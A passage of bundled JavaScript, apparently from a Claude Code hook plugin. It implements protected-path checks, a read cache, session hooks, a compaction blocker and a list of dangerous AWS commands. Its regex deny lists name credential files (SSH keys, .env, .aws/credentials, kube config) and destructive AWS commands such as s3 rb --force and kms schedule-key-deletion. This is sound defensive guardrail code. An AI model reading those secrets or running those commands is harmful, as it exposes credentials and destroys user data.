        try {
          fs6.rmSync(lockPath, { recursive: true, force: true });
        } catch {
        }
      }
      await sleep(LOCK_RETRY_DELAY_MS);
    }
  }
  return false;
}
function releaseLock(lockPath) {
  try {
    fs6.rmSync(lockPath, { recursive: true, force: true });
  } catch {
  }
}
var ENV_PATTERNS = [
  /\.env$/,
  /\.env\..*$/,
  /\.envrc$/,
  /\.env_/,
  /\.env-/
];
var GIT_PATTERNS = [
  /^\.git\//,
  /^\.git$/,
  /\/\.git\//,
  /\/\.git$/,
  /\.gitconfig$/
];
var SSH_PATTERNS = [
  /\.ssh\/id_/,
  /\.ssh\/.*\.pem$/,
  /\.ssh\/.*_rsa$/,
  /\.ssh\/.*_dsa$/,
  /\.ssh\/.*_ed25519$/,
  /\.ssh\/.*_ecdsa$/,
  /\.ssh\/known_hosts$/,
  /\.ssh\/authorized_keys$/
];
var CREDENTIAL_PATTERNS = [
  /\.aws\/credentials$/,
  /\.npmrc$/,
  /\.pypirc$/,
  /secrets\.ya?ml$/,
  /credentials\.json$/,
  /\.netrc$/,
  /\.pgpass$/,
  /\.kube\/config$/,
  /\.docker\/config\.json$/
];
var SYSTEM_DIR_PATTERNS = [
  /^\/etc\//,
  /^\/usr\//,
  /^\/var\//,
  /^\/sys\//,
  /^\/proc\//,
  /^\/boot\//,
  /^\/root\//,
  // macOS specific — CC v2.1.113 expanded dangerous-removal targets
  /^\/private\/etc\//,
  /^\/private\/var\//,
  // Carve-out mirrors security-blocker BASH_SENSITIVE_PATTERNS: CC's
  // harness-managed scratchpad (/private/tmp/claude-<uid>/…) must stay
  // writable or forked skills/subagents die on their first scratchpad write.
  /^\/private\/tmp\/(?!claude-\d+\/)/,
  /^\/private\/home\//
];
[
  ...ENV_PATTERNS,
  ...GIT_PATTERNS,
  ...SSH_PATTERNS,
  ...CREDENTIAL_PATTERNS,
  ...SYSTEM_DIR_PATTERNS
];
function resolveRealPath(inputPath) {
  const absolutePath = path2.isAbsolute(inputPath) ? inputPath : path2.resolve(getProjectDir2(), inputPath);
  try {
    return fs6.realpathSync(absolutePath);
  } catch {
    return resolveClosestAncestor(absolutePath);
  }
}
function resolveClosestAncestor(absolutePath) {
  const components = [];
  let currentPath = absolutePath;
  while (currentPath !== path2.dirname(currentPath)) {
    try {
      const resolved = fs6.realpathSync(currentPath);
      return components.length > 0 ? path2.join(resolved, ...components.reverse()) : resolved;
    } catch {
      components.push(path2.basename(currentPath));
      currentPath = path2.dirname(currentPath);
    }
  }
  return path2.resolve(absolutePath);
}
function normalizePath(inputPath) {
  if (!inputPath) {
    return ".";
  }
  let normalized = path2.normalize(inputPath);
  if (normalized.startsWith("./")) {
    normalized = normalized.slice(2);
  }
  if (!normalized) {
    return ".";
  }
  return normalized;
}
function getProjectDir2() {
  return process.env["CLAUDE_PROJECT_DIR"] || process.cwd();
}
function isWithinProject(inputPath, projectDir) {
  const projectRoot = getProjectDir2();
  const resolvedPath = resolveRealPath(inputPath);
  const resolvedProjectRoot = resolveRealPath(projectRoot);
  const projectRootWithSep = resolvedProjectRoot.endsWith(path2.sep) ? resolvedProjectRoot : resolvedProjectRoot + path2.sep;
  return resolvedPath === resolvedProjectRoot || resolvedPath.startsWith(projectRootWithSep);
}
var PATTERN_CHECKS = [
  {
    patterns: ENV_PATTERNS,
    category: "env",
    reason: "Environment files contain sensitive credentials"
  },
  {
    patterns: GIT_PATTERNS,
    category: "git",
    reason: "Git internals should be modified using git commands"
  },
  {
    patterns: SSH_PATTERNS,
    category: "ssh",
    reason: "SSH keys and certificates must be managed manually"
  },
  {
    patterns: CREDENTIAL_PATTERNS,
    category: "credential",
    reason: "Credential files must be managed manually or via secrets manager"
  },
  {
    patterns: SYSTEM_DIR_PATTERNS,
    category: "system",
    reason: "System directories require elevated privileges and manual authorization"
  }
];
function matchesPatternConfig(pathsToCheck, config) {
  for (const checkPath of pathsToCheck) {
    for (const pattern of config.patterns) {
      if (pattern.test(checkPath)) {
        return true;
      }
    }
  }
  return false;
}
function isProtectedPath(inputPath) {
  const normalized = normalizePath(inputPath);
  const resolved = resolveRealPath(inputPath);
  const pathsToCheck = [normalized, resolved];
  for (const config of PATTERN_CHECKS) {
    if (matchesPatternConfig(pathsToCheck, config)) {
      return {
        isProtected: true,
        category: config.category,
        reason: config.reason
      };
    }
  }
  return { isProtected: false };
}

// src/lib/read-cache/cache-store.ts
var SECRET_BEARING_PATTERNS = [
  ...ENV_PATTERNS,
  ...SSH_PATTERNS,
  ...CREDENTIAL_PATTERNS
];
function isSecretBearingPath(absPath) {
  return SECRET_BEARING_PATTERNS.some((pattern) => pattern.test(absPath));
}
var DEFAULT_MAX_AGE_MS = 48 * 60 * 60 * 1e3;
function getCacheRoot() {
  const override = process.env["TOKEN_COMPRESS_CACHE_DIR"];
  if (override && override.length > 0) {
    return override;
  }
  return path2.join(os.homedir(), ".claude", "cache", "token-compress");
}
function sanitizeSessionId(sessionId) {
  return sessionId.replace(/[^A-Za-z0-9_-]/g, "_");
}
function currentSessionIdFromEnv() {
  return process.env["CLAUDE_CODE_SESSION_ID"] || process.env["CLAUDE_SESSION_ID"];
}
function getSessionDir(sessionId) {
  return path2.join(getCacheRoot(), sanitizeSessionId(sessionId));
}
function getReadsPath(sessionId) {
  return path2.join(getSessionDir(sessionId), "reads.jsonl");
}
function ensureSessionDir(sessionId) {
  const dir = getSessionDir(sessionId);
  if (!fs6.existsSync(dir)) {
    fs6.mkdirSync(dir, { recursive: true, mode: 448 });
    return;
  }
  try {
    fs6.chmodSync(dir, 448);
  } catch {
  }
}
function computeContentHash(content) {
  return crypto.createHash("sha256").update(content, "utf8").digest("hex");
}
function parseEntryLine(line) {
  const trimmed = line.trim();
  if (trimmed.length === 0) {
    return null;
  }
  try {
    const parsed = JSON.parse(trimmed);
    if (parsed !== null && typeof parsed === "object" && "absPath" in parsed && typeof parsed.absPath === "string") {
      return parsed;
    }
    return null;
  } catch {
    return null;
  }
}
async function readEntry(sessionId, absPath) {
  const readsPath = getReadsPath(sessionId);
  if (!fs6.existsSync(readsPath)) {
    return null;
  }
  let raw;
  try {
    raw = fs6.readFileSync(readsPath, "utf8");
  } catch {
    return null;
  }
  const lines = raw.split("\n");
  let latest = null;
  let sawMalformed = false;
  for (const line of lines) {
    if (line.length === 0) continue;
    const entry = parseEntryLine(line);
    if (entry === null) {
      sawMalformed = true;
      continue;
    }
    if (entry.absPath === absPath) {
      latest = entry;
    }
  }
  if (sawMalformed) {
    logWarn(
      "read-cache.cache-store",
      `Skipped malformed line(s) in reads.jsonl (sessionId=${sessionId} path=${readsPath})`
    );
  }
  return latest;
}
async function writeEntry(sessionId, entry) {
  ensureSessionDir(sessionId);
  const readsPath = getReadsPath(sessionId);
  const lockPath = `${readsPath}.lock`;
  const acquired = await acquireLock(lockPath);
  if (!acquired) {
    logWarn(
      "read-cache.cache-store",
      `Failed to acquire cache write lock (sessionId=${sessionId} path=${readsPath})`
    );
    return;
  }
  try {
    const line = `${JSON.stringify(entry)}
`;
    fs6.appendFileSync(readsPath, line, { encoding: "utf8", mode: 384 });
  } finally {
    releaseLock(lockPath);
  }
}
async function snapshotFileToCache(sessionId, absPath) {
  if (isSecretBearingPath(absPath)) {
    return null;
  }
  let stat;
  try {
    stat = fs6.statSync(absPath);
  } catch {
    return null;
  }
  if (!stat.isFile()) {
    return null;
  }
  let content;
  try {
    content = fs6.readFileSync(absPath, "utf8");
  } catch {
    return null;
  }
  const entry = {
    absPath,
    contentHash: computeContentHash(content),
    size: stat.size,
    mtimeMs: stat.mtimeMs,
    cachedContent: content,
    recordedAt: (/* @__PURE__ */ new Date()).toISOString(),
    schemaVersion: 1
  };
  try {
    ensureSessionDir(sessionId);
    await writeEntry(sessionId, entry);
  } catch {
    return null;
  }
  return stat.size;
}
function dirSizeBytes(dir) {
  let total = 0;
  let entries;
  try {
    entries = fs6.readdirSync(dir, { withFileTypes: true });
  } catch {
    return 0;
  }
  for (const entry of entries) {
    const full = path2.join(dir, entry.name);
    try {
      if (entry.isDirectory()) {
        total += dirSizeBytes(full);
      } else if (entry.isFile()) {
        total += fs6.statSync(full).size;
      }
    } catch {
    }
  }
  return total;
}
async function evictOldSessions(maxAgeMs = DEFAULT_MAX_AGE_MS) {
  const root = getCacheRoot();
  if (!fs6.existsSync(root)) {
    return { evictedCount: 0, freedBytes: 0 };
  }
  const currentSessionId = currentSessionIdFromEnv();
  const currentSanitized = currentSessionId ? sanitizeSessionId(currentSessionId) : null;
  const now = Date.now();
  let evictedCount = 0;
  let freedBytes = 0;
  let entries;
  try {
    entries = fs6.readdirSync(root, { withFileTypes: true });
  } catch {
    return { evictedCount, freedBytes };
  }
  for (const entry of entries) {
    if (!entry.isDirectory()) continue;
    if (currentSanitized !== null && entry.name === currentSanitized) continue;
    const sessionDir = path2.join(root, entry.name);
    let mtimeMs;
    try {
      mtimeMs = fs6.statSync(sessionDir).mtimeMs;
    } catch {
      continue;
    }
    if (now - mtimeMs <= maxAgeMs) continue;
    const sizeBefore = dirSizeBytes(sessionDir);
    try {
      fs6.rmSync(sessionDir, { recursive: true, force: true });
      evictedCount++;
      freedBytes += sizeBefore;
    } catch {
    }
  }
  return { evictedCount, freedBytes };
}

// src/lib/read-cache/unified-diff.ts
var MAX_DELTA_LINES = 2e3;
var MAX_DELTA_CHARS = 1500;
var CONTEXT_LINES = 1;
function splitLines(content) {
  if (content.length === 0) {
    return [];
  }
  return content.split("\n");
}
function computeLcsTable(oldLines, newLines) {
  const m = oldLines.length;
  const n = newLines.length;
  const table = [];
  for (let i = 0; i <= m; i++) {
    table.push(new Array(n + 1).fill(0));
  }
  for (let i = 1; i <= m; i++) {
    for (let j = 1; j <= n; j++) {
      const row = table[i];
      const prevRow = table[i - 1];
      if (!row || !prevRow) {
        continue;
      }
      if (oldLines[i - 1] === newLines[j - 1]) {
        row[j] = (prevRow[j - 1] ?? 0) + 1;
      } else {
        row[j] = Math.max(prevRow[j] ?? 0, row[j - 1] ?? 0);
      }
    }
  }
  return table;
}
function cellScore(table, i, j) {
  if (i < 0 || j < 0) return -1;
  return table[i]?.[j] ?? 0;
}
function stepBackwalk(table, oldLines, newLines, cursor) {
  const oldLine = cursor.i > 0 ? oldLines[cursor.i - 1] : void 0;
  const newLine = cursor.j > 0 ? newLines[cursor.j - 1] : void 0;
  if (cursor.i > 0 && cursor.j > 0 && oldLine === newLine && oldLine !== void 0) {
    cursor.i--;
    cursor.j--;
    return { kind: "eq", line: oldLine };
  }
  const upScore = cellScore(table, cursor.i - 1, cursor.j);
  const leftScore = cellScore(table, cursor.i, cursor.j - 1);
  if (cursor.i > 0 && (cursor.j === 0 || upScore >= leftScore)) {
    cursor.i--;
    return { kind: "del", line: oldLine ?? "" };
  }
  cursor.j--;
  return { kind: "add", line: newLine ?? "" };
}
function walkLcsToOps(table, oldLines, newLines) {
  const ops = [];
  const cursor = { i: oldLines.length, j: newLines.length };
  while (cursor.i > 0 || cursor.j > 0) {
    ops.push(stepBackwalk(table, oldLines, newLines, cursor));
  }
  ops.reverse();
  return ops;
}
function markKeep(ops) {
  const keep = new Array(ops.length).fill(false);
  for (let idx = 0; idx < ops.length; idx++) {
    if (ops[idx]?.kind === "eq") continue;
    const start = Math.max(0, idx - CONTEXT_LINES);
    const end = Math.min(ops.length - 1, idx + CONTEXT_LINES);
    for (let k = start; k <= end; k++) {
      keep[k] = true;
    }
  }
  return keep;
}
function applyContext(ops) {
  if (ops.length === 0) return ops;
  const keep = markKeep(ops);
  const result = [];
  for (let idx = 0; idx < ops.length; idx++) {
    const op = ops[idx];
    if (keep[idx] && op) {
      result.push(op);
    }
  }
  return result;
}
function renderDiff(ops, totalAdded, totalRemoved) {
  const totalChanged = totalAdded + totalRemoved;
  const header = `@@ ${totalChanged} lines changed (+${totalAdded}/-${totalRemoved}) @@`;
  const body = ops.map((op) => {
    switch (op.kind) {
      case "eq":
        return ` ${op.line}`;
      case "add":
        return `+${op.line}`;
      case "del":
        return `-${op.line}`;
    }
  });
  return [header, ...body].join("\n");
}
function computeDelta(oldContent, newContent) {
  if (oldContent === newContent) {
    return { kind: "unchanged" };
  }
  const oldLines = splitLines(oldContent);
  const newLines = splitLines(newContent);
  if (oldLines.length > MAX_DELTA_LINES || newLines.length > MAX_DELTA_LINES) {
    return { kind: "too-large", reason: "lines" };
  }
  const table = computeLcsTable(oldLines, newLines);
  const allOps = walkLcsToOps(table, oldLines, newLines);
  let added = 0;
  let removed = 0;
  for (const op of allOps) {
    if (op.kind === "add") added++;
    else if (op.kind === "del") removed++;
  }
  const windowed = applyContext(allOps);
  const diff = renderDiff(windowed, added, removed);
  if (diff.length > MAX_DELTA_CHARS) {
    return { kind: "too-large", reason: "chars" };
  }
  return { kind: "delta", diff, oldHash: "" };
}

// src/lib/terminal-sequence.ts
var OSC_SET_WINDOW_TITLE = "\x1B]2;";
var BEL = "\x07";
var MAX_TITLE_LENGTH = 200;
function sanitizeTitleSegment(input) {
  if (typeof input !== "string") {
    return "";
  }
  return input.replace(/[\x00-\x1f\x7f]/g, "").trim();
}
function buildWindowTitleSequence(segments) {
  const cleaned = segments.map(sanitizeTitleSegment).filter((s) => s.length > 0);
  if (cleaned.length === 0) {
    return "";
  }
  let title = cleaned.join(" \xB7 ");
  if (title.length > MAX_TITLE_LENGTH) {
    title = title.slice(0, MAX_TITLE_LENGTH);
  }
  return `${OSC_SET_WINDOW_TITLE}${title}${BEL}`;
}

// src/lifecycle/session-loader.ts
var HOOK_NAME2 = "session-start";
function checkStaleSession(contextFile) {
  if (!fs6.existsSync(contextFile)) {
    return null;
  }
  try {
    const content = fs6.readFileSync(contextFile, "utf8");
    const context = JSON.parse(content);
    const wasClean = context.session_heartbeat?.was_cleanly_ended ?? true;
    if (wasClean === false) {
      return {
        lastActivity: context.session_heartbeat?.last_activity ?? null,
        filesEdited: context.dirty_tracking?.files_edited_count ?? 0
      };
    }
  } catch {
  }
  return null;
}
function formatStaleWarning(staleInfo) {
  let warning = "\u26A0\uFE0F Previous session ended without handoff";
  if (staleInfo.lastActivity) {
    const timestamp = staleInfo.lastActivity.replace("Z", "").replace("T", " ");
    warning += ` (${timestamp})`;
  }
  warning += "\n   Run `/save-state` to capture context.\n\n";
  return warning;
}
async function initializeSession(contextFile, lockDir) {
  if (!fs6.existsSync(contextFile)) {
    logDebug(HOOK_NAME2, "Context file not found, skipping state management");
    return;
  }
  if (!await acquireLock(lockDir)) {
    logWarn(HOOK_NAME2, "Failed to acquire lock, proceeding without context update");
    return;
  }
  try {
    const content = fs6.readFileSync(contextFile, "utf8");
    const context = JSON.parse(content);
    const timestamp = formatTimestamp();
    context.session_heartbeat = context.session_heartbeat || {};
    context.session_heartbeat.session_start = timestamp;
    context.session_heartbeat.was_cleanly_ended = false;
    context.session_heartbeat.last_activity = timestamp;
    context.dirty_tracking = context.dirty_tracking || {};
    context.dirty_tracking.files_edited_count = 0;
    context.dirty_tracking.files_edited_this_session = [];
    context.dirty_tracking.last_edit_timestamp = null;
    const tempFile = `${contextFile}.tmp`;
    fs6.writeFileSync(tempFile, `${JSON.stringify(context, null, 2)}
`);
    fs6.renameSync(tempFile, contextFile);
    logDebug(HOOK_NAME2, "Session initialized, dirty_tracking reset");
  } catch (error) {
    logError(HOOK_NAME2, `Failed to update context file: ${error}`);
  } finally {
    releaseLock(lockDir);
  }
}
function shellEscape(value) {
  return `'${value.replace(/'/g, "'\\''")}'`;
}
function writeEnvFile(projectDir) {
  const envFile = process.env["CLAUDE_ENV_FILE"];
  if (!envFile) {
    logDebug(HOOK_NAME2, "CLAUDE_ENV_FILE not set, skipping env file write");
    return;
  }
  try {
    const lines = [];
    if (!process.env["CONTINUITY_LOG_LEVEL"]) {
      lines.push(`export CONTINUITY_LOG_LEVEL=${shellEscape("warn")}`);
    }
    if (!process.env["CLAUDE_PROJECT_DIR"] && projectDir !== ".") {
      lines.push(`export CLAUDE_PROJECT_DIR=${shellEscape(projectDir)}`);
    }
    if (lines.length > 0) {
      fs6.appendFileSync(envFile, `${lines.join("\n")}
`);
      logDebug(HOOK_NAME2, `Wrote ${lines.length} env var(s) to CLAUDE_ENV_FILE`);
    }
  } catch (error) {
    logDebug(HOOK_NAME2, `Failed to write env file: ${error}`);
  }
}
function checkContinuitySetup(projectDir) {
  const ledgerDir = path2.join(projectDir, ".claude", "continuity", "ledgers");
  if (!fs6.existsSync(ledgerDir)) {
    return "TIP: Run `/setup-continuity` to enable session state tracking.\n\n";
  }
  try {
    const files = fs6.readdirSync(ledgerDir);
    const ledgerFiles = files.filter((f) => f.startsWith("CONTINUITY_") && f.endsWith(".md"));
    if (ledgerFiles.length === 0) {
      return "TIP: Run `/setup-continuity` to enable session state tracking.\n\n";
    }
  } catch {
  }
  return "";
}
function getCurrentBranch(projectDir) {
  const headPath = path2.join(projectDir, ".git", "HEAD");
  if (!fs6.existsSync(headPath)) {
    return null;
  }
  try {
    const content = fs6.readFileSync(headPath, "utf8").trim();
    const match = content.match(/^ref: refs\/heads\/(.+)$/);
    return match?.[1] ?? null;
  } catch {
    return null;
  }
}
function outputLedgerSummary(projectDir) {
  const ledgerPath = getCurrentLedgerPath(projectDir);
  if (!ledgerPath || !fs6.existsSync(ledgerPath)) {
    logDebug(HOOK_NAME2, `No ledger found in ${projectDir}/.claude/continuity/ledgers/`);
    return "";
  }
  try {
    const content = fs6.readFileSync(ledgerPath, "utf8");
    const summary = extractLedgerSummary(content);
    if (!summary) {
      return "";
    }
    let output = "";
    if (summary.status) {
      output += `Status: ${summary.status}
`;
    }
    if (summary.recent) {
      output += `Recent: ${summary.recent}
`;
    }
    if (summary.next) {
      output += `Next: ${summary.next}
`;
    }
    return output;
  } catch {
    return "";
  }
}
function outputHandoffSummary(projectDir) {
  const handoffPath = path2.join(
    projectDir,
    ".claude",
    "continuity",
    "handoffs",
    "handoff-latest.json"
  );
  if (!fs6.existsSync(handoffPath)) {
    return "";
  }
  try {
    const raw = fs6.readFileSync(handoffPath, "utf8");
    const parsed = JSON.parse(raw);
    const handoff = validateHandoff(parsed);
    if (!handoff) {
      logWarn(HOOK_NAME2, "handoff-latest.json failed schema validation; skipping");
      return "";
    }
    return `
${formatHandoffSummary(handoff)}

`;
  } catch (error) {
    logDebug(HOOK_NAME2, `Failed to read handoff.json: ${error}`);
    return "";
  }
}
function buildSessionWindowTitle(projectDir, branch) {
  if (process.env["CONTINUITY_TERMINAL_TITLE"] !== "1") {
    return "";
  }
  const projectName = path2.basename(path2.resolve(projectDir));
  return buildWindowTitleSequence(branch ? [projectName, branch] : [projectName]);
}
async function sessionLoader(_input) {
  const projectDir = process.env["CLAUDE_PROJECT_DIR"] || ".";
  const { provider } = getProviderInfo();
  logDebug(HOOK_NAME2, `Provider: ${provider}, project: ${projectDir}`);
  let output = "=== SESSION CONTEXT ===\n\n";
  const initResult = ensureContinuityStructure(projectDir);
  if (initResult === "created") {
    logInfo(HOOK_NAME2, `Initialized continuity structure in ${projectDir}/.claude/`);
    output += "Continuity initialized in `.claude/`. Use `/save-state` to track work.\n\n";
  } else if (initResult === "error") {
    logError(HOOK_NAME2, "Failed to initialize continuity structure");
  }
  const contextFile = path2.join(projectDir, CONTINUITY_DIRS.context, "shared-context.json");
  const lockDir = `${contextFile}.lock`;
  const staleInfo = checkStaleSession(contextFile);
  if (staleInfo) {
    logWarn(HOOK_NAME2, "Stale session detected - previous session ended uncleanly");
    output += formatStaleWarning(staleInfo);
  }
  await initializeSession(contextFile, lockDir);
  try {
    const sessionId = process.env["CLAUDE_SESSION_ID"];
    if (sessionId) {
      ensureSessionDir(sessionId);
    }
    void evictOldSessions().catch((err) => {
      logDebug(HOOK_NAME2, `read-cache eviction failed: ${err}`);
    });
  } catch (err) {
    logDebug(HOOK_NAME2, `read-cache lifecycle setup failed: ${err}`);
  }
  writeEnvFile(projectDir);
  const branch = getCurrentBranch(projectDir);
  if (branch) {
    output += `Branch: ${branch}
`;
  }
  output += outputLedgerSummary(projectDir);
  output += outputHandoffSummary(projectDir);
  output += checkContinuitySetup(projectDir);
  output += "---\nRun `/resume-session` for full context.";
  logDebug(HOOK_NAME2, "Context output complete");
  const titleSequence = buildSessionWindowTitle(projectDir, branch);
  const result = outputSuccess(output);
  if (titleSequence) {
    return { ...result, terminalSequence: titleSequence };
  }
  return result;
}
var HOOK_NAME3 = "session-end";
var MAX_LOCK_ATTEMPTS = 20;
async function sessionEnd(input) {
  const projectDir = process.env["CLAUDE_PROJECT_DIR"] || ".";
  const source = input.source || "unknown";
  logDebug(HOOK_NAME3, `Session ending, source: ${source}`);
  const contextFile = path2.join(projectDir, CONTINUITY_DIRS.context, "shared-context.json");
  if (!fs6.existsSync(contextFile)) {
    logDebug(HOOK_NAME3, "No context file found, nothing to update");
    return outputSilentSuccess();
  }
  const lockDir = `${contextFile}.lock`;
  if (!await acquireLock(lockDir, MAX_LOCK_ATTEMPTS)) {
    logError(HOOK_NAME3, "Failed to acquire lock, skipping context update");
    return outputSilentSuccess();
  }
  try {
    const raw = fs6.readFileSync(contextFile, "utf8");
    let context;
    try {
      context = JSON.parse(raw);
    } catch {
      logError(HOOK_NAME3, "Context file contains invalid JSON, skipping update");
      return outputSilentSuccess();
    }
    const timestamp = formatTimestamp();
    const heartbeat = context["session_heartbeat"] || {};
    heartbeat["was_cleanly_ended"] = true;
    heartbeat["last_activity"] = timestamp;
    context["session_heartbeat"] = heartbeat;
    const tempFile = `${contextFile}.tmp`;
    fs6.writeFileSync(tempFile, `${JSON.stringify(context, null, 2)}
`);
    fs6.renameSync(tempFile, contextFile);
    logInfo(HOOK_NAME3, `Session cleanly ended (source: ${source})`);
  } catch (error) {
    logError(HOOK_NAME3, `Failed to update context file: ${error}`);
  } finally {
    releaseLock(lockDir);
  }
  return outputSilentSuccess();
}
var HOOK_NAME4 = "git-utils";
var branchCache = /* @__PURE__ */ new Map();
var CACHE_TTL_MS = 3e4;
var PROTECTED_BRANCHES = /* @__PURE__ */ new Set([
  "main",
  "master",
  "develop",
  "dev",
  "production",
  "prod",
  "staging",
  "release"
]);
var PROTECTED_BRANCH_PATTERNS = [/^release\/.+$/, /^hotfix\/.+$/];
function getCurrentBranch2(projectDir) {
  const cwd = projectDir;
  try {
    const branch = execSync("git rev-parse --abbrev-ref HEAD", {
      cwd,
      encoding: "utf-8",
      timeout: 5e3,
      stdio: ["pipe", "pipe", "pipe"]
    }).trim();
    logDebug(HOOK_NAME4, `Current branch: ${branch}`);
    return branch;
  } catch (error) {
    logDebug(HOOK_NAME4, `Failed to get branch: ${error}`);
    return "";
  }
}
function getCachedBranch(projectDir) {
  const cwd = projectDir || process.env["CLAUDE_PROJECT_DIR"] || ".";
  const now = Date.now();
  const cached = branchCache.get(cwd);
  if (cached && now - cached.timestamp < CACHE_TTL_MS) {
    logDebug(HOOK_NAME4, `Using cached branch: ${cached.branch}`);
    return cached.branch;
  }
  const branch = getCurrentBranch2(cwd);
  branchCache.set(cwd, { branch, timestamp: now });
  return branch;
}
function isProtectedBranch(branch) {
  if (!branch) {
    return false;
  }
  if (PROTECTED_BRANCHES.has(branch.toLowerCase())) {
    return true;
  }
  for (const pattern of PROTECTED_BRANCH_PATTERNS) {
    if (pattern.test(branch)) {
      return true;
    }
  }
  return false;
}

// src/lifecycle/pre-compact-saver.ts
var BLOCK_THRESHOLD = 10;
var RECENT_SAVE_MINUTES = 15;
var HOOK_NAME5 = "pre-compact";
function formatTimestamp2() {
  return (/* @__PURE__ */ new Date()).toISOString().replace(/\.\d{3}Z$/, "Z");
}
async function preCompactSaver(_input) {
  const projectDir = process.env["CLAUDE_PROJECT_DIR"];
  if (!projectDir) {
    logWarn(HOOK_NAME5, "CLAUDE_PROJECT_DIR not set");
    return outputWarning("Project directory not set - state not preserved before compaction");
  }
  logDebug(HOOK_NAME5, `Hook fired for project: ${projectDir}`);
  const ledgerPath = getCurrentLedgerPath(projectDir);
  if (!ledgerPath || !fs6.existsSync(ledgerPath)) {
    logWarn(HOOK_NAME5, `Ledger not found at ${ledgerPath ?? "unknown"}`);
    return outputWarning("Ledger not found - state not preserved before compaction");
  }
  try {
    fs6.accessSync(ledgerPath, fs6.constants.W_OK);
  } catch {
    logWarn(HOOK_NAME5, `Ledger not writable at ${ledgerPath}`);
    return outputWarning("Ledger not writable - state not preserved before compaction");
  }
  const contextPath = path2.join(projectDir, ".claude", "context", "shared-context.json");
  try {
    if (fs6.existsSync(contextPath)) {
      const ctx = JSON.parse(fs6.readFileSync(contextPath, "utf8"));
      const editCount = ctx?.dirty_tracking?.files_edited_count ?? 0;
      const ledgerStat = fs6.statSync(ledgerPath);
      const minutesSinceLastSave = (Date.now() - ledgerStat.mtimeMs) / 6e4;
      if (editCount >= BLOCK_THRESHOLD && minutesSinceLastSave > RECENT_SAVE_MINUTES) {
        logWarn(
          HOOK_NAME5,
          `Blocking compaction: ${editCount} files edited, ledger last saved ${Math.round(minutesSinceLastSave)}m ago. Run /save-state first.`
        );
        return {
          continue: false,
          decision: "block",
          reason: `${editCount} files edited since last save (${Math.round(minutesSinceLastSave)}m ago). Run /save-state to preserve state, then compact again.`
        };
      }
    }
  } catch (error) {
    logDebug(HOOK_NAME5, `Could not check dirty state: ${error}`);
  }
  const timestamp = formatTimestamp2();
  const marker = `
---
**Auto-saved before compaction**: ${timestamp}
`;
  try {
    fs6.appendFileSync(ledgerPath, marker);
    logInfo(HOOK_NAME5, "Timestamp added to ledger");
  } catch (error) {
    logWarn(HOOK_NAME5, `Failed to write to ledger: ${error}`);
    return outputWarning("Failed to write to ledger - state not preserved");
  }
  writeHandoffJson(projectDir, timestamp);
  return outputSuccess("State preserved in ledger before compaction");
}
function writeHandoffJson(projectDir, timestamp) {
  try {
    const handoffsDir = path2.join(projectDir, ".claude", "continuity", "handoffs");
    if (!fs6.existsSync(handoffsDir)) {
      fs6.mkdirSync(handoffsDir, { recursive: true });
    }
    const contextPath = path2.join(projectDir, ".claude", "context", "shared-context.json");
    let dirtyFiles = [];
    let sessionId = process.env["CLAUDE_CODE_SESSION_ID"] ?? null;
    if (fs6.existsSync(contextPath)) {
      try {
        const ctx = JSON.parse(fs6.readFileSync(contextPath, "utf8"));
        const tracked = ctx?.dirty_tracking?.files_edited_this_session;
        if (Array.isArray(tracked)) {
          dirtyFiles = tracked.filter((f) => typeof f === "string");
        }
        if (!sessionId && typeof ctx?.session_id === "string") {
          sessionId = ctx.session_id;
        }
      } catch {
      }
    }
    const handoff = buildHandoff({
      session_id: sessionId,
      branch: getCachedBranch(projectDir) || null,
      worktree: projectDir,
      dirty_files: dirtyFiles,
      compaction_trigger: "pre-compact",
      timestamp
    });
    const outPath = path2.join(handoffsDir, "handoff-latest.json");
    const tmpPath = `${outPath}.tmp`;
    fs6.writeFileSync(tmpPath, `${JSON.stringify(handoff, null, 2)}
`);
    fs6.renameSync(tmpPath, outPath);
    logInfo(HOOK_NAME5, `Handoff JSON written to ${outPath}`);
  } catch (error) {
    logWarn(HOOK_NAME5, `Failed to write handoff.json: ${error}`);
  }
}

// src/lib/dangerous-bash/aws.ts
var ANCHOR = String.raw`(?:^|[;&|]\s*|sudo\s+)`;
var AWS_PATTERNS = [
  // s3 rb --force (recursive bucket teardown)
  {
    // nosemgrep: javascript.lang.security.audit.non-literal-regexp
    regex: new RegExp(`${ANCHOR}aws\\s+s3\\s+rb\\b[^\\n]*?\\s+--force\\b`, "i"),
    category: "aws",
    description: "aws s3 rb --force \u2014 recursive bucket teardown is irreversible"
  },
  // s3 rm --recursive (mass object delete)
  {
    // nosemgrep: javascript.lang.security.audit.non-literal-regexp
    regex: new RegExp(`${ANCHOR}aws\\s+s3\\s+rm\\b[^\\n]*?\\s+--recursive\\b`, "i"),
    category: "aws",
    description: "aws s3 rm --recursive \u2014 mass object delete; recoverable only via versioning"
  },
  // s3 sync --delete (deletes destination objects not in source)
  {
    // nosemgrep: javascript.lang.security.audit.non-literal-regexp
    regex: new RegExp(`${ANCHOR}aws\\s+s3\\s+sync\\b[^\\n]*?\\s+--delete\\b`, "i"),
    category: "aws",
    description: "aws s3 sync --delete \u2014 removes destination objects absent from source; same blast radius as recursive rm"
  },
  // rds delete-db-(instance|cluster) --skip-final-snapshot (no recovery)
  {
    // nosemgrep: javascript.lang.security.audit.non-literal-regexp
    regex: new RegExp(
      `${ANCHOR}aws\\s+rds\\s+delete-db-(?:instance|cluster)\\b[^\\n]*?\\s+--skip-final-snapshot\\b`,
      "i"
    ),
    category: "aws",
    description: "aws rds delete-db-instance/cluster --skip-final-snapshot \u2014 irreversible without snapshot"
  },
  // kms schedule-key-deletion (scheduled key destruction)
  {
    // nosemgrep: javascript.lang.security.audit.non-literal-regexp
    regex: new RegExp(`${ANCHOR}aws\\s+kms\\s+schedule-key-deletion\\b`, "i"),
    category: "aws",
    description: "aws kms schedule-key-deletion \u2014 encrypted data becomes permanently unreadable after pending window"
  },
  // secretsmanager delete-secret --force-delete-without-recovery
  {
    // nosemgrep: javascript.lang.security.audit.non-literal-regexp
    regex: new RegExp(
      `${ANCHOR}aws\\s+secretsmanager\\s+delete-secret\\b[^\\n]*?\\s+--force-delete-without-recovery\\b`,
      "i"
    ),
    category: "aws",
    description: "aws secretsmanager delete-secret --force-delete-without-recovery \u2014 bypasses 30-day recovery window"
  },
  // cloudformation delete-stack
  {
    // nosemgrep: javascript.lang.security.audit.non-literal-regexp
    regex: new RegExp(`${ANCHOR}aws\\s+cloudformation\\s+delete-stack\\b`, "i"),
    category: "aws",
    description: "aws cloudformation delete-stack \u2014 tears down all stack resources; rollback rarely possible"
  },
  // ec2 terminate-instances (vs. stop-instances which is reversible)
  {
    // nosemgrep: javascript.lang.security.audit.non-literal-regexp
